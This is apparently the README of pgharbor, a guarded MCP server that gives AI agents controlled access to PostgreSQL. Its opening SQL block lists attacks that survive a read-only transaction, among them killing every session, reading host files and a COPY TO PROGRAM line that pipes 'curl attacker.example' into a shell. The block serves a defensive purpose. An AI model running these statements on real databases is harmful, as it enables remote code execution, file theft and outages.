<p align="center">
  <img src="assets/banner-dark.svg#gh-dark-mode-only" alt="pgharbor: a safe harbor between AI agents and PostgreSQL" width="100%">
  <img src="assets/banner-light.svg#gh-light-mode-only" alt="pgharbor: a safe harbor between AI agents and PostgreSQL" width="100%">
</p>

<p align="center">
  <a href="https://github.com/DanielFreitasDev/pgharbor/actions/workflows/ci.yml"><img src="https://github.com/DanielFreitasDev/pgharbor/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <img src="https://img.shields.io/badge/PostgreSQL-9.6%20→%2019-336791?logo=postgresql&logoColor=white" alt="PostgreSQL 9.6 to 19">
  <img src="https://img.shields.io/badge/Python-3.11%20→%203.14-3776ab?logo=python&logoColor=white" alt="Python 3.11 to 3.14">
  <img src="https://img.shields.io/badge/MCP-2026--07--28-0f8f83" alt="MCP 2026-07-28">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-15803d" alt="MIT license"></a>
</p>

<p align="center">
  <b>English</b> · <a href="README.pt-BR.md">Português</a>
</p>

**pgharbor** is a [Model Context Protocol](https://modelcontextprotocol.io) server that
gives AI agents the whole of PostgreSQL (schema, data, plans, performance, replication,
security, maintenance) without handing them the keys.

It is read-only by default, asks a human before touching production or changing
anything, and does not trust a read-only transaction to keep a database safe, because a
read-only transaction does not. It works with every PostgreSQL from 9.6 to 19.

<p align="center">
  <img src="assets/demo-query-dark.svg#gh-dark-mode-only" alt="An agent exploring a schema and running a guarded query" width="100%">
  <img src="assets/demo-query-light.svg#gh-light-mode-only" alt="An agent exploring a schema and running a guarded query" width="100%">
</p>

## Why another PostgreSQL server for agents

Most of them run your agent's SQL inside `BEGIN READ ONLY` and call it safe. Inside that
transaction all of this still works:

```sql
SELECT pg_terminate_backend(pid) FROM pg_stat_activity;      -- kill every session
SELECT pg_read_file('pg_hba.conf');                          -- read files on the host
COPY (SELECT 1) TO PROGRAM 'curl attacker.example | sh';     -- run a program
SELECT set_config('statement_timeout', '0', false);          -- remove the time limit
SELECT pg_advisory_lock(1);                                  -- a lock that outlives the rollback
SET transaction_read_only = off;                             -- ... and now it is read-write
```

pgharbor refuses every one of them, and proves it on eleven PostgreSQL versions on every
commit.

| | Typical read-only server | pgharbor |
|---|---|---|
| Statement type decided by | a keyword check or a client-side parser | **the PostgreSQL server**, through a sub-select and the extended protocol |
| Functions with side effects | run | refused by name, in the statement, inside views, policies, function bodies, operators and casts |
| Huge results and huge values | returned, or cut after transfer | limited and cut **on the server** |
| Sensitive columns and giant tables | not addressed | protected columns, "index filter required", cost ceiling |
| Production | same as any database | a human approves it, once per session |
| Writes | a flag | per-connection access mode, dry run, human confirmation, audit log |
| PostgreSQL versions | recent ones | **9.6 to 19**, each one tested |
| Session state between calls | leaks | wiped with `DISCARD ALL` |

## Quick start

You need [uv](https://docs.astral.sh/uv/getting-started/installation/) (it brings its own Python).

**1. Point it at a database.** The fastest way is one environment variable:

```bash
export PGHARBOR_DSN="postgresql://user:password@localhost:5432/mydb"
```

For more than one database, or for any of the rules below, write a configuration file:

```bash
uvx --from git+https://github.com/DanielFreitasDev/pgharbor pgharbor init    # writes ~/.config/pgharbor/config.toml
uvx --from git+https://github.com/DanielFreitasDev/pgharbor pgharbor check   # validates it and tests the connections (production only when named)
```

**2. Add it to your agent.**

<details open>
<summary><b>Claude Code</b></summary>

```bash
claude mcp add pgharbor --scope user -- uvx --from git+https://github.com/DanielFreitasDev/pgharbor pgharbor
```

Then ask: *"use pgharbor to list the tables of the dev database"*.

</details>

<details>
<summary><b>Claude Desktop, Cursor, Windsurf</b> (JSON with <code>mcpServers</code>)</summary>

```json
{
  "mcpServers": {
    "pgharbor": {
      "command": "uvx",
      "args": ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"]
    }
  }
}
```

</details>

<details>
<summary><b>Codex CLI</b></summary>

```toml
# ~/.codex/config.toml
[mcp_servers.pgharbor]
command = "uvx"
args = ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"]
```

</details>

<details>
<summary><b>VS Code</b> and <b>Gemini CLI</b></summary>

```json
// .mcp.json at the workspace root (the same file Claude Code reads)
{ "mcpServers": { "pgharbor": { "type": "stdio", "command": "uvx",
  "args": ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"] } } }
```

```json
// ~/.gemini/settings.json
{ "mcpServers": { "pgharbor": { "command": "uvx",
  "args": ["--from", "git+https://github.com/DanielFreitasDev/pgharbor", "pgharbor"] } } }
```

</details>

Pin a release by adding `@v0.1.0` to the Git URL. More in [docs/clients.md](docs/clients.md).

## How a query is kept safe

<p align="center">
  <img src="assets/layers-dark.svg#gh-dark-mode-only" alt="The six layers every query goes through" width="100%">
  <img src="assets/layers-light.svg#gh-light-mode-only" alt="The six layers every query goes through" width="100%">
</p>

The two ideas that matter most:

- **The server is the judge.** Your query is sent as `SELECT * FROM (<query>) AS q` through
  the extended protocol. Inside a sub-select only a query is valid SQL, and the protocol
  accepts a single statement. No keyword list, no parser of ours, can be fooled about what
  a statement is, because neither is asked.
- **Functions are checked by name against the catalog**, wherever they hide: in the
  statement, in a view, in a row-security policy, in the body of another function, behind
  a custom operator, a cast or the `CHECK` of a domain. A function that builds its SQL at
  run time cannot be checked, so it is refused until you vouch for it by name.

Every layer, what it stops and where the protection ends is in
[docs/security.md](docs/security.md).

<p align="center">
  <img src="assets/demo-refused-dark.svg#gh-dark-mode-only" alt="What happens when the agent overreaches" width="100%">
  <img src="assets/demo-refused-light.svg#gh-light-mode-only" alt="What happens when the agent overreaches" width="100%">
</p>

## Tools

The tools adapt to the server they talk to: the same call works on 9.6 and on 19, and
says so clearly when a feature does not exist in that version. Full reference with
parameters: [docs/tools.md](docs/tools.md).

<!-- tools:start -->

<details>
<summary><b>Core</b> · 8 tools · Connections, guarded queries and plans.</summary>

| Tool | What it does |
|---|---|
| `pg_connections` | List the configured PostgreSQL connections: name, environment, access mode, limits. |
| `pg_request_access` | Ask the user to approve the use of a protected connection (for example production). |
| `pg_server_info` | Show PostgreSQL version, uptime, current role and privileges, database size, key settings, installed extensions and which optional features this server supports. |
| `pg_query` | Run one read-only SQL query (SELECT, WITH, VALUES, TABLE, SHOW) and return the rows. |
| `pg_explain` | Show the execution plan of a read query (EXPLAIN) without running it. |
| `pg_validate_sql` | Check a read query without executing it: syntax, object names, safety rules, result columns with types, tables it would touch and its estimated cost. |
| `pg_policy` | Explain what is allowed on a connection: access mode, approval, limits, function policy, protected tables and columns, denied relations. |
| `pg_audit_log` | Show the most recent entries of pgharbor's audit log: which tool ran, on which connection, the SQL, the outcome and the rule that refused it. |

</details>

<details>
<summary><b>Schema</b> · 13 tools · Find your way around: objects, definitions, DDL, dependencies.</summary>

| Tool | What it does |
|---|---|
| `pg_list_schemas` | List the schemas (namespaces) of the database with owner, comment, how many tables, views, sequences and functions each holds, and approximate size. |
| `pg_list_tables` | List tables (and optionally views, materialized views, foreign tables) with estimated row count, size on disk and comment. |
| `pg_describe_table` | Describe one table, view, materialized view or foreign table. |
| `pg_list_objects` | List objects of ONE kind. |
| `pg_describe_object` | Describe one object that is not a table: a function, procedure, aggregate, sequence, type, index, trigger, extension or schema. |
| `pg_get_ddl` | Rebuild the CREATE statement (DDL, as SQL text) of a table, view, materialized view, function, procedure, sequence, type (enum, domain, composite, range), index, trigger or schema. |
| `pg_search` | Find database objects by name. |
| `pg_search_source` | Find functions, procedures, views, materialized views and triggers whose source code contains a text, and return the matching lines with their line numbers. |
| `pg_dependencies` | Show what depends on an object and what it depends on, to answer "what breaks if I drop or change this?". |
| `pg_relationships` | Show the foreign key graph: which table references which, through which columns, with ON DELETE / ON UPDATE actions. |
| `pg_schema_overview` | Give a compact map of one schema that costs few tokens. |
| `pg_compare_schemas` | Compare one schema on two connections (for example development and production, or before and after a migration). |
| `pg_list_partitions` | Show the partitions of a partitioned table as a tree. |

</details>

<details>
<summary><b>Data</b> · 4 tools · Look at rows and column statistics, through the guarded path.</summary>

| Tool | What it does |
|---|---|
| `pg_sample_rows` | Show a few rows of a table or view to see what the data looks like. |
| `pg_count_rows` | Count the rows of a table: an instant estimate from the planner statistics, and with `exact=true` the real count(*). |
| `pg_column_stats` | Describe the data of each column from the planner statistics, without reading the table. |
| `pg_export_query` | Run a read-only query and save the result to a local file (CSV, JSON or JSON Lines) instead of sending the rows to the conversation. |

</details>

<details>
<summary><b>Performance</b> · 12 tools · What the server is doing and where time and space go.</summary>

| Tool | What it does |
|---|---|
| `pg_activity` | Show who is connected right now. |
| `pg_locks` | Show lock waits as a blocking tree. |
| `pg_top_queries` | Rank the queries of the current database from pg_stat_statements. |
| `pg_table_stats` | Show per-table activity from pg_stat_user_tables. |
| `pg_index_stats` | List indexes with size, scans, tuples read and fetched, unique/primary/valid flags, access method and definition, and find the ones to drop. |
| `pg_bloat` | Estimate how much space tables and btree indexes waste (bloat) and rank them by wasted bytes, without scanning anything. |
| `pg_vacuum_status` | Report the state of vacuum and autovacuum. |
| `pg_sizes` | Find what takes the space: the biggest databases, schemas, tables (with heap data, indexes and TOAST shown separately), indexes or tablespaces, largest first. |
| `pg_cache_io` | Report cache effectiveness and I/O. |
| `pg_progress` | Show long operations that are running now with their progress. |
| `pg_database_stats` | Show pg_stat_database for the current database (or every database with `all_databases=true`). |
| `pg_stat_view` | Read any system view or catalog table from pg_catalog or information_schema by name, for example pg_stat_user_functions, pg_stat_slru, pg_stat_ssl, pg_prepared_xacts, pg_stat_wal, pg_stat_replication or pg_replication_slots. |

</details>

<details>
<summary><b>Health</b> · 5 tools · Check-ups, index advice, settings, sequences, WAL.</summary>

| Tool | What it does |
|---|---|
| `pg_settings` | Search server configuration parameters (GUCs). |
| `pg_sequences_health` | Find sequences that are running out of numbers. |
| `pg_wal_checkpoints` | Explain how checkpoints and WAL behave. |
| `pg_index_advisor` | Suggest indexes. |
| `pg_health_check` | Run a quick DBA check-up and return findings ranked by severity. |

</details>

<details>
<summary><b>Replication</b> · 1 tool · Standbys, slots, publications and subscriptions.</summary>

| Tool | What it does |
|---|---|
| `pg_replication` | Show the replication state of the server in one answer. |

</details>

<details>
<summary><b>Security</b> · 4 tools · Roles, privileges, audits. Never returns a secret.</summary>

| Tool | What it does |
|---|---|
| `pg_roles` | List database roles (users and groups) with their attributes (superuser, createdb, createrole, login, replication, bypassrls), connection limit, password expiry, the roles each one belongs to (`member_of`) and its members,... |
| `pg_privileges` | Show access rights, in one of two ways. |
| `pg_security_audit` | Audit the database for security weaknesses and rank the findings as critical, warning or info, each with a recommendation. |
| `pg_find_sensitive_columns` | Find columns that look like they hold sensitive data, judging by column name, comment and type only. |

</details>

<details>
<summary><b>Extensions</b> · 3 tools · Installed extensions and what they add; integrity checks.</summary>

| Tool | What it does |
|---|---|
| `pg_extensions` | List the extensions installed in this database (version, schema, whether a newer version can be installed with ALTER EXTENSION ... |
| `pg_extension_report` | Report on one installed extension: version, schema, the objects it created (functions, types, tables, operators), its settings, and extension-specific facts. |
| `pg_integrity_check` | Look for data integrity problems. |

</details>

<details>
<summary><b>Administration</b> · 4 tools · Change the database. Only on connections configured for it, always confirmed by the user.</summary>

| Tool | What it does |
|---|---|
| `pg_execute` | Run ONE statement that changes data or structure. |
| `pg_maintenance` | Run a maintenance command on a table, index or materialized view. |
| `pg_signal_backend` | Cancel the running query of another session (`cancel`) or close the session entirely (`terminate`), by process id. |
| `pg_import_csv` | Bulk-load a local CSV file into an existing table with COPY, in one transaction. |

</details>

<!-- tools:end -->

Anything without a dedicated tool is still reachable: `pg_query` runs any read query on
any catalog, and `pg_stat_view` reads any statistics view by name, including the ones
future versions add.

## Configuration

One TOML file, and it is the only thing that decides what a connection may do. Nothing
the agent says can change it.

```toml
[connections.dev]
host = "localhost"
dbname = "app"
user_env = "APP_DB_USER"            # secrets stay in the environment
password_env = "APP_DB_PASSWORD"
access = "read-write"               # read-only | read-write | admin

[connections.prod]
environment = "production"          # a human approves its use, once per session
host = "db.internal"
dbname = "app"
user_env = "APP_DB_USER"
password_env = "APP_DB_PASSWORD"
access = "read-only"
max_plan_cost = 500000              # refuse queries the planner says are too heavy

[[connections.prod.protect]]
table = "billing.cards"
deny_columns = ["card_number", "cvv"]   # never readable, however the query is written
require_index_filter = true             # no full scans of this table
note = "Filter by id or customer_id."
```

Also there: function policies, credential redaction, limits, audit log, and **custom
tools**, which turn a query you approve into a tool of its own so that production needs no
free SQL at all. Everything is in [docs/configuration.md](docs/configuration.md).

## Where it sits

<p align="center">
  <img src="assets/architecture-dark.svg#gh-dark-mode-only" alt="How pgharbor sits between the agent and the databases" width="100%">
  <img src="assets/architecture-light.svg#gh-light-mode-only" alt="How pgharbor sits between the agent and the databases" width="100%">
</p>

## Compatibility

| | Supported | How it is checked |
|---|---|---|
| PostgreSQL | 9.6, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 | the integration suite runs on each one |
| Python | 3.11 to 3.14 | unit tests on each one |
| MCP | 2025-11-25 and 2026-07-28 | protocol tests on both, including the confirmation dialogs |
| Connection poolers | PgBouncer (transaction mode) | tested; settings are applied per transaction when start-up options are refused |
| Platforms | Linux, macOS, Windows | the database suite runs on Linux; unit tests and server start-up on all three |

Details and the per-version feature table: [docs/compatibility.md](docs/compatibility.md).

## Questions

<details>
<summary><b>Can it change my data?</b></summary>

Only on a connection whose `access` you set to `read-write` or `admin` in the
configuration file, only one statement at a time, and by default only after you confirm
it in a dialog. On a read-only setup the writing tools are not even listed.

</details>

<details>
<summary><b>Is the read-only mode really enough for production?</b></summary>

It is several layers, tested with more than 180 attacks on every supported version, and the
[security document](docs/security.md) is explicit about the limits. The strongest setup
adds a database role with only the privileges the agent needs: with that, most of what
pgharbor blocks does not exist as a risk in the first place.

</details>

<details>
<summary><b>Why not just use a PostgreSQL parser library?</b></summary>

A client-side parser is a different program from the server: any difference between the
two is a way in, which is how SQL assistants have been bypassed. pgharbor lets the server
decide what a statement is. Its own scanner only looks for names, is conservative on
purpose, and is tested against PostgreSQL's real scanner.

</details>

<details>
<summary><b>Does it send my data anywhere?</b></summary>

No. It is a local process that talks to your databases and to the MCP client that
started it, over stdio. There is no network listener and no telemetry.

</details>

<details>
<summary><b>What about really old servers?</b></summary>

PostgreSQL 9.6 is supported and tested like the others. Tools that need a newer feature
(declarative partitioning, `pg_stat_io`, ...) say which version introduced it.

</details>

## Development

```bash
git clone https://github.com/DanielFreitasDev/pgharbor && cd pgharbor
uv sync --group dev --group oracle
scripts/pg-matrix.sh up          # PostgreSQL 9.6 to 19 in containers
uv run pytest                    # everything, on every version
```

See [CONTRIBUTING.md](CONTRIBUTING.md) and [docs/writing-tools.md](docs/writing-tools.md).
Security reports: [SECURITY.md](SECURITY.md).

## License

[MIT](LICENSE). Use it, change it, ship it.

pgharbor's own code has no copyleft terms. At run time it depends on the official
[MCP Python SDK](https://github.com/modelcontextprotocol/python-sdk) (MIT),
[pydantic](https://github.com/pydantic/pydantic) (MIT) and
[psycopg](https://www.psycopg.org/) (LGPL-3.0, used as an unmodified library).
